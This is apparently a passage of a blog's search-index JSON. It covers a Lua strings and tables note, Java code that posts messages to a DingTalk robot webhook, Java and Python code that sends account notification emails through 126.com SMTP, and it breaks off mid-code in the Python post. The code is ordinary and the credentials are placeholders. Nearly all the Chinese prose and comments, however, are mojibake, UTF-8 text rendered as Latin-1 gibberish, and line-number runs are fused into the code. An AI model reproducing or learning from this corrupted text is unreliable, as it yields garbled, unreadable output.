b_len2:&quot; .. b_len2 .. &quot;, b_len3:&quot; .. b_len3) -- è¾“å‡º-- a_len:3, b_len1:2, b_len2:6, b_len3:6 æºæ–‡ä»¶utf-8 å­—ç¬¦ä¸²è¿æ¥ .. ï¼šä¸èƒ½æ“ä½œnilç±»å‹ å­—ç¬¦ä¸²è¿æ¥æ“ä½œç¬¦ï¼Œåœ¨è¿æ¥å¤šä¸ªæ“ä½œæ—¶å®é™…ä¼šåˆ›å»ºå­—ç¬¦ä¸²çš„å¤šä¸ªå‰¯æœ¬ï¼Œä¼šå¤§é‡ä½¿ç”¨è¯¥æ“ä½œç¬¦æ—¶ä¼šå¸¦æ¥å†…å­˜å’ŒCPUçš„å¼€é”€ é•¿å­—ç¬¦ä¸² [[é•¿å­—ç¬¦ä¸²]] 1234567891011121314local a = [[adfadfadfadf,hello world&#123; &quot;conio&quot;:1, &quot;b&quot;:2, &quot;c&quot;: [ 1,2,3 ] &#125;]] print(a) å­—ç¬¦ä¸²æ ‡å‡†åº“å¸¸ç”¨çš„æ–¹æ³• gsub å­—ç¬¦ä¸²æ›¿æ¢å‡½æ•°ï¼Œç”¨äºæŸ¥æ‰¾å’Œå¤„ç†æ›¿æ¢å†…å®¹ string.packå’Œstring.unpack ç”¨äºåœ¨äºŒè¿›åˆ¶æ•°æ®å’ŒLuaçš„åŸºæœ¬ç±»å‹å€¼ä¹‹é—´è¿›è¡Œè½¬æ¢çš„å‡½æ•°ã€‚packæŠŠå€¼æ‰“åŒ…æˆäºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œunpackä»äºŒè¿›åˆ¶å­—ç¬¦ä¸²ä¸­æå–è¿™äº›å€¼ utf8åº“ ï¼šä»Lua5.3å¼€å§‹ï¼Œluaå¼•å…¥äº†ä¸€ä¸ªç”¨äºæ“ä½œUTF-8ç¼–ç çš„Unicodeå­—ç¬¦ä¸²çš„æ ‡å‡†åº“ æ¨¡å¼åŒ¹é… tabletableæ˜¯æ•°æ®ç»“æ„ æ˜¯Luaé‡Œé¢ä¸»è¦çš„æ•°æ®ç»“æ„ï¼Œç”¨æ¥å®ç°å…¶ä»–è¯­è¨€ä¸­çš„å¸¸è§çš„æ•°æ®ç»“æ„ï¼šMapã€é›†åˆã€æ•°ç»„ã€è®°å½•ç­‰ éå† ä½¿ç”¨ paris å’Œipairséå†ä¸€ä¸ª table æ ‡å‡†åº“ tableçš„æ ‡å‡†åº“ï¼Œç”¨äºæ“ä½œtableã€‚å¸¸è§çš„apiæœ‰ï¼štable.insert, table.remove, table.move, table.sort å…ƒè¡¨å’Œå…ƒæ–¹æ³• Luaè®¾è®¡äº†å…ƒè¡¨å’Œå…ƒæ–¹æ³•ï¼Œç›®çš„åœ¨äºï¼šç”¨äºæ‹“å±•ä»»æ„å€¼åœ¨é¢å¯¹ä¸€ä¸ªä½ç½®æ“ä½œæ—¶çš„è¡Œä¸º function functionåœ¨Luaè¯­è¨€æ˜¯luaæ˜¯â€œç¬¬ä¸€ç±»å€¼â€ï¼ŒLuaä¸­æ‰€æœ‰çš„å‡½æ•°éƒ½æ˜¯åŒ¿åçš„ï¼Œä¸ä»…å¯ä»¥å­˜å‚¨åœ¨å…¨å±€å˜é‡ä¸­ï¼Œè¿˜å¯ä»¥å­˜å‚¨åœ¨è¡¨å­—æ®µå’Œå±€éƒ¨å˜é‡ä¸­ã€‚ å‚è€ƒæ–‡ç« https://developer.aliyun.com/article/836104","categories":[{"name":"å…¥ä¾µæ£€æµ‹","slug":"å…¥ä¾µæ£€æµ‹","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/"},{"name":"æ‚ä¸ƒæ‚å…«","slug":"å…¥ä¾µæ£€æµ‹/æ‚ä¸ƒæ‚å…«","permalink":"https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[{"name":"soæ–‡ä»¶","slug":"soæ–‡ä»¶","permalink":"https://gryffinbit.top/tags/so%E6%96%87%E4%BB%B6/"}],"author":"Gryffinbit"},{"title":"javaè°ƒç”¨é’‰é’‰apiæ¥å£ï¼Œå®ç°æœºå™¨äººè‡ªåŠ¨å‘é€æ¶ˆæ¯å¹¶è‰¾ç‰¹ä¸ªäºº","slug":"Javaè°ƒç”¨é’‰é’‰apiæ¥å£ï¼Œå®ç°æœºå™¨äººè‡ªåŠ¨å‘é€æ¶ˆæ¯å¹¶è‰¾ç‰¹ä¸ªäºº","date":"2022-08-17T15:09:47.000Z","updated":"2024-11-12T06:59:36.000Z","comments":true,"path":"2022/08/17/Javaè°ƒç”¨é’‰é’‰apiæ¥å£ï¼Œå®ç°æœºå™¨äººè‡ªåŠ¨å‘é€æ¶ˆæ¯å¹¶è‰¾ç‰¹ä¸ªäºº/","permalink":"https://gryffinbit.top/2022/08/17/Java%E8%B0%83%E7%94%A8%E9%92%89%E9%92%89api%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF%E5%B9%B6%E8%89%BE%E7%89%B9%E4%B8%AA%E4%BA%BA/","excerpt":"","text":"å‰è¨€æ•´ä¸ªé¡¹ç›®æ‰“åŒ…ï¼ˆ åŒ…æ‹¬ç”¨javaå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨ï¼‰ï¼š é“¾æ¥: https://pan.baidu.com/s/1yjzsDVV4LlbOqx7VvpVuKQ?pwd=1kn8 æå–ç : 1kn8â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v5çš„åˆ†äº« ç”¨javaå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨ï¼ŒBlogè·³è½¬ï¼šhttps://gryffinbit.top/2022/08/17/%E7%94%A8java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/ è·å–é’‰é’‰å¼€å‘èµ„æ ¼ç™»é™†é’‰é’‰ç®¡ç†åå° é’‰é’‰ç®¡ç†åå°- é’‰é’‰ç»Ÿä¸€èº«ä»½è®¤è¯ æ³¨å†Œä¼ä¸šèµ„æ ¼çš„æ—¶å€™å¿˜äº†æˆªå›¾äº†ã€‚ã€‚ã€‚æ€»ä¹‹æ­¥éª¤ç™»é™†ç®¡ç†åå°ï¼Œå®ƒä¼šå‘ŠçŸ¥ä½ æ²¡æœ‰ç®¡ç†å‘˜èº«ä»½çš„è´¦å·ï¼Œä½ é€‰æ‹©æ³¨å†Œä¸€ä¸ªï¼ŒæŒ‰ç…§æµç¨‹æç¤ºæ³¨å†Œå®Œäº†ä¹‹åå°±æœ‰æƒé™äº†ã€‚è¿™æ—¶å€™é’‰é’‰å°±ä¼šç”Ÿæˆä¸€ä¸ªç¾¤ã€‚åœ¨è¿™ä¸ªç¾¤é‡Œæ·»åŠ æœºå™¨äººã€‚ ç‚¹ç¾¤çš„è®¾ç½®ï¼Œé€‰æ‹©ç¾¤åŠ©æ‰‹ï¼Œæ·»åŠ æœºå™¨äºº æ·»åŠ è‡ªå®šä¹‰æœºå™¨äºº è®¾å®šå‚æ•° å®‰å…¨è®¾å®šï¼Œä¸€å…±æœ‰ä¸‰ä¸ªï¼Œæ ¹æ®éœ€è¦å‹¾é€‰ã€‚æ¯”å¦‚é€‰æ‹©äº†å®šåˆ¶çš„å…³é”®è¯ï¼Œé‚£ä¹ˆå‘é€æ¶ˆæ¯çš„æ—¶å€™ï¼Œåªæœ‰å½“æ¶ˆæ¯ä¸­å­˜åœ¨è¿™ä¸ªå…³é”®è¯ï¼Œæ‰èƒ½å‘é€æˆåŠŸ æœºå™¨äººæ·»åŠ æˆåŠŸåï¼Œä¼šç”Ÿæˆä¸€ä¸ªwebhookï¼Œå°†å®ƒå¤åˆ¶ä¿å­˜ï¼Œä»£ç ä¸­éœ€è¦ç”¨åˆ°å®ƒ ä»£ç DingNotice.java 12345678910111213141516171819202122232425262728293031323334package main.controller;import java.util.ArrayList;import java.util.HashMap;import java.util.List;import java.util.Map;public class DingNotice &#123; public static void main(String[] args)&#123; // é’‰é’‰çš„webhook String dingDingToken=&quot;https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxxxxxx&quot;; // è¯·æ±‚çš„JSONæ•°æ®ï¼Œè¿™é‡Œæˆ‘ç”¨mapåœ¨å·¥å…·ç±»é‡Œè½¬æˆjsonæ ¼å¼ Map&lt;String,Object&gt; json = new HashMap(); Map&lt;String,Object&gt; text = new HashMap(); Map&lt;String,List&lt;String&gt;&gt; phone = new HashMap(); String [] mobile = &#123;&#125;; List mob = new ArrayList&lt;String&gt;(); // æ•°æ®åº“å¡«å…¥æ³¨å†Œç”¨æˆ·çš„æ‰‹æœºå· mob.add(&quot;186xxxxxxx&quot;);//è¦@çš„äººçš„æ‰‹æœºå·ç  json.put(&quot;msgtype&quot;,&quot;text&quot;);//æŒ‡å®šæ¶ˆæ¯ç±»å‹æ˜¯text text.put(&quot;content&quot;,&quot;æ–‡å­—å†…å®¹&quot;);// phone.put(&quot;atMobiles&quot;, mob);//å°†æ‰‹æœºå·ç æ”¾è¿›å‚æ•°ä¸­ json.put(&quot;text&quot;,text); json.put(&quot;at&quot;, phone); // å‘é€postè¯·æ±‚ String response = DingNoticeTest.sendPostByMap(dingDingToken, json); System.out.println(&quot;å“åº”ç»“æœï¼š&quot;+response); &#125;&#125; DingNoticeTest.java 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788package main.controller;import com.alibaba.fastjson.JSON;import java.io.*;import java.net.URL;import java.net.URLConnection;import java.util.HashMap;import java.util.Map;import java.util.Map.Entry;public class DingNoticeTest &#123; /** * å‘é€POSTè¯·æ±‚ï¼Œå‚æ•°æ˜¯Map, contentType=x-www-form-urlencoded * * @param url * @param mapParam * @return */ public static String sendPostByMap(String url, Map&lt;String, Object&gt; mapParam) &#123; Map&lt;String, String&gt; headParam = new HashMap(); //æŒ‡å®šhttpçš„å†…å®¹ç±»å‹ä¸ºJSONæ•°æ®æ ¼å¼ headParam.put(&quot;Content-type&quot;, &quot;application/json;charset=UTF-8&quot;); return sendPost(url, mapParam, headParam); &#125; /** * å‘æŒ‡å®š URL å‘é€POSTæ–¹æ³•çš„è¯·æ±‚ * * @param url å‘é€è¯·æ±‚çš„ URL * @param param è¯·æ±‚å‚æ•°ï¼Œ * @return æ‰€ä»£è¡¨è¿œç¨‹èµ„æºçš„å“åº”ç»“æœ */ public static String sendPost(String url, Map&lt;String, Object&gt; param, Map&lt;String, String&gt; headParam) &#123; PrintWriter out = null; BufferedReader in = null; String result = &quot;&quot;; try &#123; URL realUrl = new URL(url);//é€šè¿‡æ­¤å¯¹è±¡å¯ä»¥è§£æå‡ºurlä¸­çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ¯”å¦‚åè®®ï¼ŒéªŒè¯ä¿¡æ¯ï¼Œç«¯å£ï¼Œè¯·æ±‚å‚æ•°ï¼Œå®šä½ä½ç½®ç­‰ // æ‰“å¼€å’ŒURLä¹‹é—´çš„è¿æ¥ URLConnection conn = realUrl.openConnection(); // è®¾ç½®é€šç”¨çš„è¯·æ±‚å±æ€§ è¯·æ±‚å¤´ conn.setRequestProperty(&quot;accept&quot;, &quot;*/*&quot;); conn.setRequestProperty(&quot;connection&quot;, &quot;Keep-Alive&quot;); conn.setRequestProperty(&quot;user-agent&quot;, &quot;Fiddler&quot;); if (headParam != null) &#123; for (Entry&lt;String, String&gt; entry : headParam.entrySet()) &#123; conn.setRequestProperty(entry.getKey(), entry.getValue()); &#125; &#125; // å‘é€POSTè¯·æ±‚å¿…é¡»è®¾ç½®å¦‚ä¸‹ä¸¤è¡Œ conn.setDoOutput(true); conn.setDoInput(true); // è·å–URLConnectionå¯¹è±¡å¯¹åº”çš„è¾“å‡ºæµ out = new PrintWriter(conn.getOutputStream()); // å‘é€è¯·æ±‚å‚æ•° out.print(JSON.toJSONString(param)); // flushè¾“å‡ºæµçš„ç¼“å†² out.flush(); // å®šä¹‰BufferedReaderè¾“å…¥æµæ¥è¯»å–URLçš„å“åº” in = new BufferedReader( new InputStreamReader(conn.getInputStream())); String line; while ((line = in.readLine()) != null) &#123; result += line; &#125; &#125; catch (Exception e) &#123;// logger.info(&quot;å‘é€ POST è¯·æ±‚å‡ºç°å¼‚å¸¸ï¼&quot; + e); e.printStackTrace(); &#125; //ä½¿ç”¨finallyå—æ¥å…³é—­è¾“å‡ºæµã€è¾“å…¥æµ finally &#123; try &#123; if (out != null) &#123; out.close(); &#125; if (in != null) &#123; in.close(); &#125; &#125; catch (IOException ex) &#123; ex.printStackTrace(); &#125; &#125; return result; &#125;&#125; ç»“æœ å‚è€ƒæ–‡ç« https://www.cnblogs.com/barrywxx/p/10716593.html#/publishEapp","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"é’‰é’‰API","slug":"é’‰é’‰API","permalink":"https://gryffinbit.top/tags/%E9%92%89%E9%92%89API/"},{"name":"æœºå™¨äºº","slug":"æœºå™¨äºº","permalink":"https://gryffinbit.top/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"}],"author":"Gryffinbit"},{"title":"ç”¨javaå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨","slug":"ç”¨javaå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨","date":"2022-08-17T15:08:49.000Z","updated":"2024-11-12T06:59:53.000Z","comments":true,"path":"2022/08/17/ç”¨javaå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨/","permalink":"https://gryffinbit.top/2022/08/17/%E7%94%A8java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"å‰è¨€ç›¸åŒåŠŸèƒ½å®ç°ï¼Œpythonç‰ˆæœ¬ è·³è½¬Blogï¼šhttps://gryffinbit.top/2022/08/15/ubuntu%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E6%90%AD%E5%BB%BAsmtp%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/ è°ƒç”¨é’‰é’‰apiæ¥å£ï¼Œå®ç°æœºå™¨äººè‡ªåŠ¨å‘é€æ¶ˆæ¯å¹¶è‰¾ç‰¹ä¸ªäººï¼Œblogè·³è½¬ï¼š https://gryffinbit.top/2022/08/17/%E8%B0%83%E7%94%A8%E9%92%89%E9%92%89api%E6%8E%A5%E5%8F%A3%EF%BC%8C%E5%AE%9E%E7%8E%B0%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%87%AA%E5%8A%A8%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF%E5%B9%B6%E8%89%BE%E7%89%B9%E4%B8%AA%E4%BA%BA/ smtpæœåŠ¡å™¨æˆæƒ æˆ‘ä½¿ç”¨çš„æ˜¯126çš„smtpæœåŠ¡ã€‚ä¹‹å‰æœ‰è‡ªå·±æ­å»ºè¿‡smtpæœåŠ¡å™¨ï¼Œä½†ä¼šæœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€æ˜¯ç”¨è…¾è®¯äº‘æœåŠ¡å™¨æ­å»ºçš„è¯ï¼Œ25ç«¯å£éœ€è¦ç”³è¯·ï¼Œè€Œä¸”ä¸èƒ½å‘é‚®ä»¶ï¼Œå¯èƒ½å°ç¦ã€‚ç¬¬äºŒå°±æ˜¯è‡ªå·±æ­å»ºçš„smtpæœåŠ¡å™¨ï¼Œå‘é€é‚®ä»¶å¤§æ¦‚ç‡ä¼šè¢«æ‰”è¿›åƒåœ¾ç®±ã€‚ 126é‚®ç®±æˆæƒ å¼€å¯smtpæœåŠ¡ å¼€å¯æˆåŠŸåï¼Œä¼šè·å¾—ä¸€ä¸ªæˆæƒç ï¼Œåé¢ä¼šç”¨åˆ°ã€‚ ä»£ç  mailUsername æ˜¯å¼€å¯smtpæœåŠ¡ï¼Œå¹¶è·å–åˆ°æˆæƒç çš„126é‚®ç®±ã€‚ mailAuthPassword æ˜¯å¼€å¯smtpæœåŠ¡åï¼Œè·å–åˆ°çš„æˆæƒç  sender å¡«å†™å‘ä»¶äººçš„é‚®ç®±åœ°å€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115package main.controller;import javax.mail.Session;import javax.mail.Transport;import javax.mail.internet.InternetAddress;import javax.mail.internet.MimeMessage;import java.util.Date;import java.util.Properties;public class Notice&#123; // ç”±äºé’‰é’‰æ”¶ä»¶æœ‰é™åˆ¶ï¼Œå¦‚æœä½¿ç”¨è‡ªå·±æ­å»ºçš„smtpæœåŠ¡å™¨ä¼šå¯¼è‡´å‘é€çš„é‚®ä»¶è¢«é’‰é’‰æ”¾å…¥åƒåœ¾ç®±ï¼Œæ‰€ä»¥è¿™é‡ŒsmtpæœåŠ¡å™¨é‡‡ç”¨çš„126çš„smtpæœåŠ¡å™¨ // å‘ä»¶äººä½¿ç”¨ä¸ªäººé‚®ç®± // smtpæœåŠ¡å™¨éœ€è¦æˆæƒç  public static String mailUsername = &quot;xxxx@126.com&quot;; public static String mailAuthPassword = &quot;xxxx&quot;; // ç½‘æ˜“126é‚®ç®±çš„ SMTP æœåŠ¡å™¨åœ°å€ä¸º: smtp.126.com public static String mailHost = &quot;smtp.126.com&quot;; // æ”¶ä»¶äººé‚®ç®± public static String receiveMailAccount = &quot;xxxx@xxx.com&quot;; // éœ€è¦ä¼ å‚çš„éƒ¨åˆ†ï¼Œå…ˆæš‚æ—¶åœ¨è¿™é‡Œç”¨å…¬å…±å˜é‡æµ‹è¯• public static String username = &quot;test&quot;; public static String passwd = &quot;test123&quot;; public static String usergroup = &quot;admin&quot;; public static void main(String[] args) throws Exception &#123; // 1. åˆ›å»ºå‚æ•°é…ç½®, ç”¨äºè¿æ¥é‚®ä»¶æœåŠ¡å™¨çš„å‚æ•°é…ç½® Properties props = new Properties(); // å‚æ•°é…ç½® props.setProperty(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;); // ä½¿ç”¨çš„åè®®ï¼ˆJavaMailè§„èŒƒè¦æ±‚ï¼‰ props.setProperty(&quot;mail.smtp.host&quot;, mailHost); // å‘ä»¶äººçš„é‚®ç®±çš„ SMTP æœåŠ¡å™¨åœ°å€ props.setProperty(&quot;mail.smtp.auth&quot;, &quot;true&quot;); // éœ€è¦è¯·æ±‚è®¤è¯ final String smtpPort = &quot;25&quot;; props.setProperty(&quot;mail.smtp.port&quot;, smtpPort); props.setProperty(&quot;mail.smtp.socketFactory.fallback&quot;, &quot;false&quot;); // æ­¤ç±»å°†ç”¨äºåˆ›å»ºSMTPå¥—æ¥å­—ã€‚ props.setProperty(&quot;mail.smtp.socketFactory.port&quot;, smtpPort); // 2. æ ¹æ®é…ç½®åˆ›å»ºä¼šè¯å¯¹è±¡, ç”¨äºå’Œé‚®ä»¶æœåŠ¡å™¨äº¤äº’ Session session = Session.getDefaultInstance(props); session.setDebug(true); // è®¾ç½®ä¸ºdebugæ¨¡å¼, å¯ä»¥æŸ¥çœ‹è¯¦ç»†çš„å‘é€ log // 3. åˆ›å»ºä¸€å°é‚®ä»¶ MimeMessage message = createMimeMessage(session, mailUsername, receiveMailAccount); // 4. æ ¹æ® Session è·å–é‚®ä»¶ä¼ è¾“å¯¹è±¡ Transport transport = session.getTransport(); // 5. ä½¿ç”¨ é‚®ç®±è´¦å· å’Œ å¯†ç  è¿æ¥é‚®ä»¶æœåŠ¡å™¨, è¿™é‡Œè®¤è¯çš„é‚®ç®±å¿…é¡»ä¸ message ä¸­çš„å‘ä»¶äººé‚®ç®±ä¸€è‡´, å¦åˆ™æŠ¥é”™ // // PS_01: æˆè´¥çš„åˆ¤æ–­å…³é”®åœ¨æ­¤ä¸€å¥, å¦‚æœè¿æ¥æœåŠ¡å™¨å¤±è´¥, éƒ½ä¼šåœ¨æ§åˆ¶å°è¾“å‡ºç›¸åº”å¤±è´¥åŸå› çš„ log, // ä»”ç»†æŸ¥çœ‹å¤±è´¥åŸå› , æœ‰äº›é‚®ç®±æœåŠ¡å™¨ä¼šè¿”å›é”™è¯¯ç æˆ–æŸ¥çœ‹é”™è¯¯ç±»å‹çš„é“¾æ¥, æ ¹æ®ç»™å‡ºçš„é”™è¯¯ // ç±»å‹åˆ°å¯¹åº”é‚®ä»¶æœåŠ¡å™¨çš„å¸®åŠ©ç½‘ç«™ä¸ŠæŸ¥çœ‹å…·ä½“å¤±è´¥åŸå› ã€‚ // // PS_02: è¿æ¥å¤±è´¥çš„åŸå› é€šå¸¸ä¸ºä»¥ä¸‹å‡ ç‚¹, ä»”ç»†æ£€æŸ¥ä»£ç : // (1) é‚®ç®±æ²¡æœ‰å¼€å¯ SMTP æœåŠ¡; // (2) é‚®ç®±å¯†ç é”™è¯¯, ä¾‹å¦‚æŸäº›é‚®ç®±å¼€å¯äº†ç‹¬ç«‹å¯†ç ; // (3) é‚®ç®±æœåŠ¡å™¨è¦æ±‚å¿…é¡»è¦ä½¿ç”¨ SSL å®‰å…¨è¿æ¥; // (4) è¯·æ±‚è¿‡äºé¢‘ç¹æˆ–å…¶ä»–åŸå› , è¢«é‚®ä»¶æœåŠ¡å™¨æ‹’ç»æœåŠ¡; // (5) å¦‚æœä»¥ä¸Šå‡ ç‚¹éƒ½ç¡®å®šæ— è¯¯, åˆ°é‚®ä»¶æœåŠ¡å™¨ç½‘ç«™æŸ¥æ‰¾å¸®åŠ©ã€‚ // transport.connect(mailUsername, mailAuthPassword); // 6. å‘é€é‚®ä»¶, å‘åˆ°æ‰€æœ‰çš„æ”¶ä»¶åœ°å€, message.getAllRecipients() è·å–åˆ°çš„æ˜¯åœ¨åˆ›å»ºé‚®ä»¶å¯¹è±¡æ—¶æ·»åŠ çš„æ‰€æœ‰æ”¶ä»¶äºº, æŠ„é€äºº, å¯†é€äºº transport.sendMessage(message, message.getAllRecipients()); // 7. å…³é—­è¿æ¥ transport.close(); &#125; /** * è´¦å·åˆ›å»ºç»“æœé€šçŸ¥ * * @param session å’ŒæœåŠ¡å™¨äº¤äº’çš„ä¼šè¯ * @param sendMail å‘ä»¶äººé‚®ç®± * @param receiveMail æ”¶ä»¶äººé‚®ç®± * @return * @throws Exception */ public static MimeMessage createMimeMessage(Session session, String sendMail, String receiveMail) throws Exception &#123; // 1. åˆ›å»ºä¸€å°é‚®ä»¶ MimeMessage message = new MimeMessage(session); // 2. From: å‘ä»¶äºº message.setFrom(new InternetAddress(sendMail, &quot;ç¬¬äºŒç»„è´¦å·åˆ›å»ºç»“æœé€šçŸ¥&quot;, &quot;UTF-8&quot;)); // 3. To: æ”¶ä»¶äººï¼ˆå¯ä»¥å¢åŠ å¤šä¸ªæ”¶ä»¶äººã€æŠ„é€ã€å¯†é€ï¼‰ message.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(receiveMail, &quot;XXç”¨æˆ·&quot;, &quot;UTF-8&quot;)); // 4. Subject: é‚®ä»¶ä¸»é¢˜ message.setSubject(&quot;è´¦å·åˆ›å»ºç»“æœå‘ŠçŸ¥&quot;, &quot;UTF-8&quot;); // 5. Content: é‚®ä»¶æ­£æ–‡ï¼ˆå¯ä»¥ä½¿ç”¨htmlæ ‡ç­¾ï¼‰ // è¿˜å¯ä»¥æ·»åŠ å…¶ä»–å†…å®¹ï¼Œæ¯”å¦‚åŸŸè´¦å·ã€vmwareè´¦å·ã€svnè´¦å·ã€gitè´¦å· String context = &quot;ä½ çš„è´¦å·åˆ›å»ºç»“æœå¦‚ä¸‹:&lt;/br&gt;&quot;; context += &quot;ç”¨æˆ·åï¼š&quot; + username + &quot;&lt;/br&gt;&quot;; context += &quot;å¯†ç ï¼š&quot; + passwd + &quot;&lt;/br&gt;&quot;; context += &quot;å±ç»„ï¼š&quot; + usergroup + &quot;&lt;/br&gt;&quot;; message.setContent(context, &quot;text/html;charset=UTF-8&quot;); // 6. è®¾ç½®å‘ä»¶æ—¶é—´ message.setSentDate(new Date()); // 7. ä¿å­˜è®¾ç½® message.saveChanges(); return message; &#125;&#125; ç»“æœ å¤‡æ³¨æ•´ä¸ªé¡¹ç›®æ‰“åŒ…ï¼ˆåŒ…æ‹¬è°ƒç”¨é’‰é’‰apiæ¥å£ï¼Œå®ç°æœºå™¨äººè‡ªåŠ¨å‘é€æ¶ˆæ¯å¹¶è‰¾ç‰¹ä¸ªäººï¼‰ï¼š é“¾æ¥: https://pan.baidu.com/s/1yjzsDVV4LlbOqx7VvpVuKQ?pwd=1kn8 æå–ç : 1kn8â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v5çš„åˆ†äº«","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"smtp","slug":"smtp","permalink":"https://gryffinbit.top/tags/smtp/"},{"name":"java","slug":"java","permalink":"https://gryffinbit.top/tags/java/"}],"author":"Gryffinbit"},{"title":"ç”¨pythonå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨","slug":"ç”¨pythonå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨","date":"2022-08-17T15:08:37.000Z","updated":"2024-11-12T06:59:52.000Z","comments":true,"path":"2022/08/17/ç”¨pythonå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨/","permalink":"https://gryffinbit.top/2022/08/17/%E7%94%A8python%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"å‰è¨€ç”¨javaå®ç°é‚®ä»¶å‘é€ï¼ŒsmtpæœåŠ¡å™¨ï¼ŒBlogè·³è½¬ï¼šhttps://gryffinbit.top/2022/08/17/%E7%94%A8java%E5%AE%9E%E7%8E%B0%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%EF%BC%8Csmtp%E6%9C%8D%E5%8A%A1%E5%99%A8/ smtpæœåŠ¡å™¨æˆæƒ æˆ‘ä½¿ç”¨çš„æ˜¯126çš„smtpæœåŠ¡ã€‚ä¹‹å‰æœ‰è‡ªå·±æ­å»ºè¿‡smtpæœåŠ¡å™¨ï¼Œä½†ä¼šæœ‰ä¸¤ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€æ˜¯ç”¨è…¾è®¯äº‘æœåŠ¡å™¨æ­å»ºçš„è¯ï¼Œ25ç«¯å£éœ€è¦ç”³è¯·ï¼Œè€Œä¸”ä¸èƒ½å‘é‚®ä»¶ï¼Œå¯èƒ½å°ç¦ã€‚ç¬¬äºŒå°±æ˜¯è‡ªå·±æ­å»ºçš„smtpæœåŠ¡å™¨ï¼Œå‘é€é‚®ä»¶å¤§æ¦‚ç‡ä¼šè¢«æ‰”è¿›åƒåœ¾ç®±ã€‚ 126é‚®ç®±æˆæƒ å¼€å¯smtpæœåŠ¡ å¼€å¯æˆåŠŸåï¼Œä¼šè·å¾—ä¸€ä¸ªæˆæƒç ï¼Œåé¢ä¼šç”¨åˆ°ã€‚ ä»£ç mail_username æ˜¯å¼€å¯smtpæœåŠ¡ï¼Œå¹¶è·å–åˆ°æˆæƒç çš„126é‚®ç®±ã€‚ mail_auth_password æ˜¯å¼€å¯smtpæœåŠ¡åï¼Œè·å–åˆ°çš„æˆæƒç  sender å¡«å†™å‘ä»¶äººçš„é‚®ç®±åœ°å€ def __init__(self): ä¸­çš„å†…å®¹ï¼Œæ˜¯ä¸€äº›å›ºå®šçš„é‚®ä»¶å‘é€éœ€è¦çš„å‚æ•° sendcontextmail è¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥æŠŠå‚æ•°å»æ‰ï¼Œæˆ‘å†™è¿™ä¸ªpyçš„æ—¶å€™ï¼Œæ˜¯éœ€è¦è‡ªåŠ¨è·å–ï¼Œå®šåˆ¶å‘é€å†…å®¹ã€‚å¦‚æœä¸éœ€è¦å‚æ•°ï¼Œå¯ä»¥ç›´æ¥å»æ‰ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445import smtplibfrom email.header import Headerfrom email.mime.text import MIMETextfrom email.mime.multipart import MIMEMultipart# ç¬¬ä¸‰æ–¹ SMTP æœåŠ¡class SMTP(): def __init__(self): self.mail_host = &#x27;smtp.126.com&#x27; # è®¾ç½®æœåŠ¡å™¨ self.mail_username = &#x27;xxxxxxx@126.com&#x27; # ç”¨æˆ·å self.mail_auth_password = &quot;xxxxxxx&quot; # æˆæƒå¯†ç  self.sender = &#x27;xxxxxxx@xx.com&#x27; # å‘ä»¶äººé‚®ç®± self.init() def init(self): self.sendcontextmail(&#x27;test&#x27;, &#x27;test&#x27;, &#x27;admin&#x27;) def send_mail(self, receiver, subject, context): &quot;&quot;&quot;ä½¿ç”¨126é‚®ç®±çš„ smtp æä¾›é‚®ä»¶æ”¯æŒ&quot;&quot;&quot; message = MIMEText(context, &#x27;html&#x27;, 